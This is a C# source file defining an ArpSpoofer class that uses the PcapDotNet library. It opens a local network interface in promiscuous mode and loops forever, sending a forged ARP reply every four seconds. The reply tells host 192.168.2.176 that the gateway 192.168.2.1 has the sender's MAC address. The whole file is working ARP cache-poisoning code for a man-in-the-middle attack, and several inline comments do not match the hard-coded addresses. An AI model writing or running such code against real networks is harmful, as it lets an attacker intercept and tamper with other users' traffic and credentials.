using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using PcapDotNet.Base;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets.Ethernet;
using System.Threading;

namespace ducap
{
    class ArpSpoofer
    {


        public PacketCommunicator communicator;

       public ArpSpoofer()
        {   // Retrieve the device list from the local machine
            IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
            PacketDevice selectedDevice = allDevices[0];
            communicator = selectedDevice.Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000);
        }

        public void sendArpSpoof() {
            Thread proxy = new Thread(arpSender);
            proxy.Start();
            
        }

        private void arpSender()
        {
            while (true)
             {
                    communicator.SendPacket(BuildArpPacket());
                    Thread.Sleep(4000);
            };
          
        }

        private static Packet BuildArpPacket()
        {
            EthernetLayer ethernetLayer =
                new EthernetLayer
                {
                    
                    Source = new MacAddress("90:2b:34:33:35:f3"),
                    Destination = new MacAddress("84:4b:f5:1a:81:f6"),
                    EtherType = EthernetType.Arp, // Will be filled automatically.
                };

            ArpLayer arpLayer =
                new ArpLayer
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = ArpOperation.Reply,
                    //156, 128, 223, 132, 155, 156
                   // 144, 43, 52, 51, 53, 243
                    SenderHardwareAddress = new byte[] { 144, 43, 52, 51, 53, 243 }.AsReadOnly(), // 03:03:03:03:03:03.
                    SenderProtocolAddress = new byte[] { 192,168, 2, 1 }.AsReadOnly(), // 1.2.3.4.
                    TargetHardwareAddress = new byte[] { 132, 75, 245, 26, 129, 246 }.AsReadOnly(), // 04:04:04:04:04:04.
                    TargetProtocolAddress = new byte[] { 192, 168, 2, 176 }.AsReadOnly(), // 11.22.33.44.
                };

            PacketBuilder builder = new PacketBuilder(ethernetLayer, arpLayer);

            return builder.Build(DateTime.Now);
        }

    }
}
